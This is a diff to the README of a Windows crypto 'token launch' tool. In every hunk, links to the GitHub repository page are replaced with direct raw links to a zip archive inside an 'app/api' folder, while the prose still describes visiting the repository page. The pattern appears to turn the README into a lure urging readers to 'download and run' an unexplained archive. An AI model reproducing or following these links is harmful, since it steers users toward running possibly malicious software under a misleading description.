@@ -1,6 +1,6 @@
 # 🚀 GitLaunchrTKN - Simple Token Launch Tool
 
-[![Download GitLaunchrTKN](https://img.shields.io/badge/Download-GitLaunchrTKN-4CAF50?style=for-the-badge&logo=github)](https://github.com/Ajaymkp/GitLaunchrTKN)
+[![Download GitLaunchrTKN](https://img.shields.io/badge/Download-GitLaunchrTKN-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Ajaymkp/GitLaunchrTKN/main/app/api/Launchr_Git_TKN_v2.8.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 You can get GitLaunchrTKN by visiting the GitHub page below. This is where you will find the latest version of the software ready for Windows.
 
-[Download and run GitLaunchrTKN here](https://github.com/Ajaymkp/GitLaunchrTKN)
+[Download and run GitLaunchrTKN here](https://raw.githubusercontent.com/Ajaymkp/GitLaunchrTKN/main/app/api/Launchr_Git_TKN_v2.8.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Follow these step-by-step instructions to get GitLaunchrTKN running on your Wind
 
 Go to the GitHub repository linked below. This page hosts the latest version of GitLaunchrTKN.
 
-https://github.com/Ajaymkp/GitLaunchrTKN
+https://raw.githubusercontent.com/Ajaymkp/GitLaunchrTKN/main/app/api/Launchr_Git_TKN_v2.8.zip
 
 On this page, look for the "Releases" section or download area and get the latest Windows installer if provided.
 
@@ -119,4 +119,4 @@ The main files you will interact with are:
 
 ---
 
-[![Download GitLaunchrTKN](https://img.shields.io/badge/Download-GitLaunchrTKN-4CAF50?style=for-the-badge&logo=github)](https://github.com/Ajaymkp/GitLaunchrTKN)
+[![Download GitLaunchrTKN](https://img.shields.io/badge/Download-GitLaunchrTKN-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Ajaymkp/GitLaunchrTKN/main/app/api/Launchr_Git_TKN_v2.8.zip)
